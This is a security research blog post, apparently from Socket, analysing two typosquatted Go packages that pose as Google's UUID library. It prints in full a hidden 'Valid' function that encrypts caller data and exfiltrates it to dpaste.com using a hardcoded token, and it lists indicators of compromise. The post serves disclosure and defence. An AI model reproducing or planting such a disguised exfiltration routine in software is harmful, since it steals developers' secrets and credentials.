---
title: "Malicious Go Packages Impersonate Google's UUID Library and Exfiltrate Data"
short_title: "Malicious Go Packages Impersonate Google's UUID Library"
date: 2025-12-05 12:00:00 +0000
categories: [Go, Supply Chain]
tags: [Go, Typosquatting, Data Exfiltration, Supply Chain Security, T1195.002, T1204.005, T1036, T1656, T1567.003, T1027.013]
description: "A pair of typosquatted Go packages posing as Google's UUID library quietly turn helper functions into encrypted exfiltration channels to a paste site, putting developer and CI data at risk."
toc: true
canonical_url: https://socket.dev/blog/malicious-go-packages-impersonate-googles-uuid-library-and-exfiltrate-data
source: Socket
image:
  path: https://cdn.sanity.io/images/cgdhsj6q/production/d9207a9fb6698a84ccf0c9820058d67324f380e4-1024x1024.png?w=1600&q=95&fit=max&auto=format
  alt: Malicious Go Packages Impersonate Google's UUID Library and Exfiltrate Data
---

The Socket Threat Research Team uncovered two related malicious Go packages, [`github[.]com/bpoorman/uuid`](https://socket.dev/go/package/github.com/bpoorman/uuid) and [`github[.]com/bpoorman/uid`](https://socket.dev/go/package/github.com/bpoorman/uid), that typosquat trusted UUID libraries and quietly exfiltrate data to the pastebin-style service `dpaste`. First published in May 2021, `github[.]com/bpoorman/uuid` has remained live in the Go ecosystem for more than four years.

The threat actor behind the GitHub alias `bpoorman` imitates the long-standing `github.com/google/uuid` and `github.com/pborman/uuid` packages, preserving their legitimate UUID behavior while adding a backdoor through a hidden `Valid` function that silently encrypts and uploads caller-supplied data using a hardcoded `dpaste` API token.

At the time of writing, the malicious `github[.]com/bpoorman/uuid` package is still listed on the Go package discovery site `pkg.go.dev` and is accessible via the public Go module mirror at `proxy.golang.org`. The malicious `github[.]com/bpoorman/uid` package is no longer listed on `pkg.go.dev` but remains accessible from the public module mirror, where it has also been cached since 2021. We have reported both packages to the Go security team and requested their removal, as well as suspension of the publisher's GitHub account.

![Socket AI Scanner analysis of the malicious bpoorman/uuid package](https://cdn.sanity.io/images/cgdhsj6q/production/590b81d1886113450043d4faeaf5a951f2ffabb7-622x604.png?w=1600&q=95&fit=max&auto=format)
_Socket AI Scanner's analysis of the malicious `github[.]com/bpoorman/uuid` package shows that a hidden `Valid` function behaves as a backdoor, aggregating caller-supplied data, encrypting it, and sending the resulting payload to hxxps://dpaste[.]com/api/v2/ over HTTPS using a hardcoded bearer token for covert data exfiltration._

## UUID Utilities as the Wiring of Modern Go

Imported by more than 100,000 Go packages, `github.com/google/uuid` and `github.com/pborman/uuid` form one of the most widely used utility families in the Go ecosystem. Together they are the de facto standard UUID implementation in Go and are the default choice for creating identifiers for users, sessions, orders, jobs, and database rows. The legitimate `github.com/pborman/uuid` package has existed for years and now wraps `github.com/google/uuid`, and both are described as packages that "generate and inspect UUIDs based on RFC 4122 and DCE 1.1: Authentication and Security Services".

The malicious package `github[.]com/bpoorman/uuid` typosquats the maintainer name (`pborman` versus `bpoorman`) while keeping the `/uuid` suffix, which closely matches what developers expect after seeing `pborman/uuid` and `google/uuid` in tutorials and official examples. Their popularity makes the legitimate UUID packages attractive targets for supply chain attacks.

In this case, the malicious Go package closely imitates the real libraries: it looks legitimate on a quick scan of the README and API and appears to preserve expected UUID behavior, so most developers would not notice anything unusual. The only visible addition is a helper function named `Valid`, which acts as an exfiltration primitive that encrypts its arguments and sends them to `dpaste.com` using a hardcoded bearer token.

![pkg.go.dev page for google/uuid](https://cdn.sanity.io/images/cgdhsj6q/production/f0e7fa6d1b3a7aca3e4268a0b051e00304beab89-1696x754.png?w=1600&q=95&fit=max&auto=format)
_`pkg.go.dev` page for the legitimate `github.com/google/uuid` Go package, a widely-used UUID library imported by over 100,000 Go packages that generates and inspects UUIDs based on RFC 4122 and DCE 1.1._

![pkg.go.dev page for bpoorman/uuid](https://cdn.sanity.io/images/cgdhsj6q/production/fa3953d01ebd69556b6cabcf0ad1209d40667ee3-1692x756.png?w=1600&q=95&fit=max&auto=format)
_`pkg.go.dev` page for the malicious `github[.]com/bpoorman/uuid` Go package, a typosquat of the legitimate UUID libraries that reuses the Google style README and matches the expected UUID API so it behaves correctly for normal operations while quietly adding a hidden `Valid` function that exfiltrates supplied data._

## Imported by: 0 and What it Means

On the Go package discovery site `pkg.go.dev`, `github.com/bpoorman/uuid` shows `Imported by: 0` and a publish date of May 27, 2021. The "Imported by: 0" value indicates that `pkg.go.dev` has not indexed any public Go packages that declare an import on this malicious package. It does not establish absence of use, because private repositories, internal services, and one-off tools are outside that visibility window. Unlike some others, the Go ecosystem does not provide global per package download statistics from its proxies, so we cannot estimate the real impact or number of affected systems from public data alone.

In ecosystems such as npm or PyPI, download counts provide at least a rough sense of exposure. Go works differently. Go module mirror `proxy.golang.org` cache modules and serve them to clients, but they do not publish per module download numbers, and `pkg.go.dev` focuses on documentation and import relationships rather than traffic statistics. As a result, the "Imported by" field is a useful popularity signal for public code, but it is an insufficient upper bound on real world usage.

## Inside the Exfiltration Function

At the core of the malicious package is the exfiltration function shown below, taken directly from the package source with inline comments added by Socket for clarity.

```go
// Valid encrypts caller data and exfiltrates it to dpaste.com over HTTPS.
func Valid(s string, dst []byte) {
        r := make([]byte, aes.BlockSize/2)
        if _, err := io.ReadFull(rand.Reader, r); err != nil {
        }                                   // Read 8 random bytes for key suffix

        k1 := "57a475a22da17139"            // Fixed key prefix
        k2 := hex.EncodeToString(r)         // Hex encoded suffix
        aes_key := k1 + k2                  // Full AES key

        crd := string(dst) + s              // Plaintext from dst and s
        pt := []byte(crd)

        block, err := aes.NewCipher([]byte(aes_key)); if err != nil {}
        // Init AES, ignore error
        ct := make([]byte, aes.BlockSize+len(pt))
        iv := ct[:aes.BlockSize]
        if _, err := io.ReadFull(rand.Reader, iv); err != nil {
        }
        // Random IV, ignore error

        stream := cipher.NewCFBEncrypter(block, iv)
        stream.XORKeyStream(ct[aes.BlockSize:], pt) // AES CFB encrypt

        stringct := hex.EncodeToString(ct)          // Hex ciphertext (IV + data)
        stringiv := hex.EncodeToString(iv)          // Hex IV

        d, e2 := json.Marshal(map[string]string{
                "aiv": stringiv,
                "crd": stringct,
                "pwd": k2,                       // Key suffix for reconstruction
        }); if e2 != nil { return }

        cont := hex.EncodeToString(d)               // Hex encoded JSON

        data := url.Values{}
        data.Set("content", cont)                   // dpaste content field

        client := &http.Client{
                Timeout: 4 * time.Second,           // Short exfil timeout
        }

        req, e1 := http.NewRequest("POST",
                "https://dpaste.com/api/v2/",
                strings.NewReader(data.Encode())); if e1 != nil { return }

        req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
        req.Header.Set("Authorization", "Bearer 5bd4e8cb8165d4d2")
        // hardcoded API token

        resp, e2 := client.Do(req)
        defer func() {
                if resp != nil {
                        resp.Body.Close()
                        if r := recover(); r != nil {}
                }
        }(); if e2 != nil { return }
        // On network error, fail silently
        // No return value; caller sees no sign of exfiltration
}
```

The malicious behavior triggers only when application code explicitly calls `Valid`, a name that plays on the legitimate `Validate` helper from the standard UUID library. `Valid` is misleading; it is an exfiltration helper, not a validator. The function exfiltrates only what its caller passes in. It takes a string `s` and a byte slice `dst`, concatenates them into a single string, encrypts that string with AES CFB using a key derived from a constant prefix plus random bytes, then sends the encrypted payload to the `dpaste` API as form data in the `content` field. In a typical misuse, a developer might pass a user identifier, email address, or session token as `s`, believing they are simply checking that the value is "valid".

Behaviorally, the function has several notable traits. It uses a hardcoded AES key prefix, a fixed JSON structure with fields `aiv`, `crd`, and `pwd`, and a single `dpaste` bearer token. It suppresses almost all errors and uses a short HTTP client timeout, which together support a quiet, fire and forget exfiltration pattern in performance sensitive services.

There is no indication of complex targeting logic. The routine does not inspect hostnames, user agents, or IP ranges; it simply uploads whatever values the calling code supplies as `s` and `dst`. Because `Valid` exfiltrates exactly `string(dst) + s`, any application code path that passes sensitive data into that function becomes a leak point, whether that is authentication logic, configuration handling, logging, or build tooling. In practice, the malicious `github[.]com/bpoorman/uuid` package can steal any secrets, identifiers, or other sensitive data that developers choose to pass into `Valid`. If it is used in logging or tracing paths inside CI and deployment pipelines, it can exfiltrate build identifiers, internal request IDs, and even long-lived credentials and signing keys. The threat actor gains whatever the caller decides to validate, and because the payload is encrypted before it leaves the host, casual inspection of network traffic or `dpaste` content is unlikely to reveal that those values have been stolen.

## The bpoorman GitHub Account and dpaste

We traced the malicious Go package to a small, low-profile GitHub account at `github[.]com/bpoorman`. At the time of writing, the account exposes a single public repository, `uid`, with no description, releases, stars, or forks. Its only Go source file, `uid.go`, implements the same encrypted exfiltration routine that we analyzed in the `github[.]com/bpoorman/uuid` package, including the hardcoded AES key prefix and the bearer token for the `dpaste` API.

Historically, this repository backed a separate malicious Go package, `github[.]com/bpoorman/uid`. Although `pkg.go.dev` no longer exposes documentation for `github[.]com/bpoorman/uid`, the Go module mirror at `proxy.golang.org` still serves the package at `v0.0.0-20210528062104-e068190dd06b`. In other words, this malicious package remains accessible with default Go module mirror settings, even after its `pkg.go.dev` page was removed. The `uid` and `uuid` packages share the same exfiltration helper code and `dpaste`-based data theft behavior.

![bpoorman/uid repository exfiltration code](https://cdn.sanity.io/images/cgdhsj6q/production/2de33f729d751f278ac28f11dd2499867c8e0d74-1584x897.png?w=1600&q=95&fit=max&auto=format)
_Excerpt from the threat actor's `github[.]com/bpoorman/uid` repository showing the `uid.go` exfiltration code that issues an HTTP POST to hxxps://dpaste[.]com/api/v2/ and sets a hardcoded header `Authorization: Bearer 5bd4e8cb8165d4d2`._

For exfiltration, the threat actor chose `dpaste`, a legitimate paste service with a documented API that supports bearer tokens and programmatic paste creation. Using a public paste site as a collection point offers several advantages: it blends malicious traffic with normal developer usage, removes the need to register and maintain threat actor-controlled infrastructure, and shifts storage to a third-party service that enterprise defenders may not monitor closely.

![dpaste.com create interface](https://cdn.sanity.io/images/cgdhsj6q/production/f5c619f38fa4f11fb88ee7c540f88a0994b08a3c-912x670.png?w=1600&q=95&fit=max&auto=format)
_"Create a new item" `dpaste.com` interface, the same paste service whose API the malicious `github[.]com/bpoorman/uuid` and `github[.]com/bpoorman/uid` packages abuse to upload encrypted exfiltrated data using a hardcoded bearer token._

## Outlook and Recommendations

By imitating Google's UUID library and hiding an encrypted exfiltration helper behind a familiar name, the `github[.]com/bpoorman/uuid` and `github[.]com/bpoorman/uid` packages abuse one of the most widely used building blocks in Go applications.

Defenders should anticipate similar tactics from other adversaries. Threat actors can reuse the same exfiltration pattern, swap in different paste or object storage services, and register new typosquats around logging, HTTP, JSON, and other core utilities.

Defending against this class of attack requires treating every new dependency as untrusted until proven otherwise, especially small utilities that imitate well-known libraries. Teams should review new import paths, verify that helper functions do not introduce unexpected network egress or cryptography, and continuously scan existing projects for typosquatted modules that mimic core packages. CI and build environments deserve particular attention, since a single exfiltration event from these pipelines can leak long lived tokens and signing keys.

Socket's security tooling is designed to support this kind of defense in-depth. [Socket's free GitHub App](https://socket.dev/features/github) adds real-time scanning to pull requests, flagging suspicious or malicious dependencies before merge, including unexpected network access, cryptography, or new exfiltration helpers. The [Socket CLI](https://socket.dev/features/cli) surfaces red flags during installs and lets teams enforce allow and deny rules, blocking risky behaviors such as `postinstall` scripts, unexpected network egress, decrypt and eval loaders, or native binaries. [Socket Firewall](https://socket.dev/blog/introducing-socket-firewall) mediates dependency requests and blocks known malicious packages, including transitive dependencies, before the package manager fetches them, and works best when paired with the CLI for behavior level gating. The [Socket browser extension](https://chromewebstore.google.com/detail/socket-security/jbcobpbfgkhmjfpjjepkcocalmpkiaop?pli=1) alerts users to suspicious packages while they browse documentation or registries, and [Socket MCP](https://socket.dev/blog/socket-mcp) extends these protections into AI assisted coding workflows, warning when language models suggest malicious or hallucinated packages. Integrating these tools into everyday development and CI workflows helps teams spot impersonated packages like `github[.]com/bpoorman/uuid` and `github[.]com/bpoorman/uid` and reduce the chance of accidental adoption.

## Indicators of Compromise (IOCs)

### Malicious Go Packages

- `github[.]com/bpoorman/uuid`
- `github[.]com/bpoorman/uid`

### Threat Actor's GitHub

- `github[.]com/bpoorman`

### AES Key Prefix String

- `57a475a22da17139`

### HTTP Header

- `Authorization: Bearer 5bd4e8cb8165d4d2`

## MITRE ATT&CK

- T1195.002 — Supply Chain Compromise: Compromise Software Supply Chain
- T1204.005 — User Execution: Malicious Library
- T1036 — Masquerading
- T1656 — Impersonation
- T1567.003 — Exfiltration Over Web Service: Exfiltration to Text Storage Sites
- T1027.013 — Obfuscated Files or Information: Encrypted/Encoded File
